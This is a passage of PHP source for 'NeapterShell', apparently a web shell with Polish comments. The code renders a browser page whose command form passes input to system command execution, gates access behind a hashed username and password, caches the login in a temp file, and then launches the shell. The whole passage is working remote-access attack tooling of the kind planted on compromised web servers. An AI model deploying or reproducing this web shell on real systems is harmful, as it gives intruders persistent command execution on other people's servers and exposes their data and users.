						if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
						{
							$sConsole = $this -> aHelpModules[ $sModule ] . ' - ' . $oModule -> getHelp();
						}
						else
						{
							$sConsole = $oModule -> get();
						}
					}
					else
					{
						$sConsole = sprintf( 'Nie ma takiej komendy "%s"', htmlspecialchars( $this -> sCmd ) );
					}
			}
		}
		elseif( $sCmd === '' )
		{
			$sConsole = 'Wpisz ":help", by zobaczyć pomoc';
		}
		/**
		 * Wykonanie komendy systemowej
		 */
		else
		{
			$sConsole = $this -> getCommandSystem( $sCmd );
		}

		if( $bRaw || ( PHP_SAPI === 'cli' ) )
		{
			return htmlspecialchars_decode( $sConsole ) . "\r\n";
		}

		/**
		 * Wlasna zawartosc okna
		 */
		if( ! $bOwnContent )
		{
			$sContent  = sprintf( '<pre id="console">%s</pre><br/>' .
				'<form action="%s" method="post">' .
				'<input type="text" name="cmd" value="%s" size="110" id="cmd" autocomplete="off"/>' .
				'<input type="submit" name="submit" value="Execute" id="cmd-send"/></form>',
				$sConsole,
				Request::getCurrentUrl(),
				htmlspecialchars( ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : (string) $sCmd ) )
			);
		}

		return $this -> getContent( $sContent );
	}

	/**
	 * Pobieranie calosci strony
	 *
	 * @uses   Request
	 *
	 * @access private
	 * @param  string  $sData         Zawartosc strony
	 * @param  boolean $bExdendedInfo [Optional]<br>Czy wyswietlac informacje o wersji PHP, zaladowanych modulach itp
	 * @return string
	 */
	private function getContent( $sData, $bExdendedInfo = TRUE )
	{
		/**
		 * isAjax
		 */
		if( strncasecmp( Request::getServer( 'HTTP_X_REQUESTED_WITH' ), 'XMLHttpRequest', 14 ) === 0 )
		{
			preg_match( '~<pre id="console">(.*)</pre>~s', $sData, $aMatch );

			if( $aMatch === array() )
			{
				return 'Występił nieznany błąd';
			}

			return $aMatch[1];
		}

		$sScript = file_get_contents( 'Lib/js.js' );

		/**
		 * Wylaczenie JavaScript
		 */
		if( ! $this -> bJs )
		{
			$sScript = NULL;
		}

		$sMenu = $this -> getMenu();
		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
		$sTitle = sprintf( 'NeapterShell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
		$sVersion = self::VERSION;
return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body>
<div id=\"body\">" .
( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : NULL ) .
"<div id=\"content\">{$sData}</div></div>" .
( $bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL ) .
"</div>{$sScript}</body></html>";
	}

	/**
	 * Wyswietlanie strony
	 *
	 * @access private
	 * @return string
	 */
	public function get()
	{
		/**
		 * Uwierzytelnianie
		 */
		if( $this -> sAuth !== NULL )
		{
			$sAuth = NULL;

			if(     is_file( $sAuthFilename = $this -> sTmp . '/' . $this -> sPrefix . md5( Request::getServer( 'REMOTE_ADDR' ) . Request::getServer( 'USER_AGENT' ) ) . '_auth' )
			    && ( ( $sData = file_get_contents( $sAuthFilename ) ) !== FALSE )
			)
			{
				$sAuth = $this -> decode( $sData );
			}

			if( $sAuth !== sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ), TRUE ) )
			{
				if( ! ( ( ( $sUser = Request::getPost( 'user') ) !== FALSE )
				    && ( ( $sPass = Request::getPost( 'pass') ) !== FALSE )
				    && ( $this -> sAuth === sha1( $sUser . "\xff" . $sPass ) ) )
				)
				{
					$this -> bJs = FALSE;

					echo $this -> getContent(
							sprintf( '<form action="%s" method="post"><input type="text" name="user"/><input type="password" name="pass"/><input type="submit" name="submit" value="Go !"/></form>',
								Request::getCurrentUrl()
							), FALSE
					);
					return ;
				}

				file_put_contents( $sAuthFilename, $this -> encode( sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ), TRUE ) ) );
			}
		}

		/**
		 * Strasznie duzo jest kodu, wygodniej jest rozdzielic
		 * to na inne metody
		 */
		echo $this -> getActionBrowser();
	}

	/**
	 * Oczyszczanie argumentow ze zbednych znakow
	 *
	 * @access private
	 * @param  string & $sVar Argument
	 * @return void
	 */
	private function parseArgv( & $sVar )
	{
		$sVar = strtr( $sVar, array
			(
				'\\\'' => '\'',
				'\\"'  => '"'
			)
		);

		if(    ( ( substr( $sVar, 0, 1 ) === '"' ) && ( substr( $sVar, -1 ) === '"' ) )
		    || ( ( substr( $sVar, 0, 1 ) === '\'' ) && ( substr( $sVar, -1 ) === '\'' ) )
		)
		{
			$sVar = substr( $sVar, 1, -1 );
		}
	}

	/**
	 * Usuwanie poczakowego oraz koncowego znaku " / '
	 *
	 * @access private
	 * @param  string $sVal Ciag znakow
	 * @return string
	 */
	private function rmQuotes( $sVal )
	{
		if(    ( ( substr( $sVal, 0, 1 ) === '"' ) && ( substr( $sVal, -1 ) === '"' ) )
		    || ( ( substr( $sVal, 0, 1 ) === '\'' ) && ( substr( $sVal, -1 ) === '\'' ) )
		)
		{
			return substr( $sVal, 1, -1 );
		}

		return $sVal;
	}

}

/**
 * Wylaczanie wszystkich bufferow
 */
for( $i = 0; $i < ob_get_level(); ++$i )
{
	ob_end_clean();
}

$oShell = new Shell();
$oShell -> get();

exit ;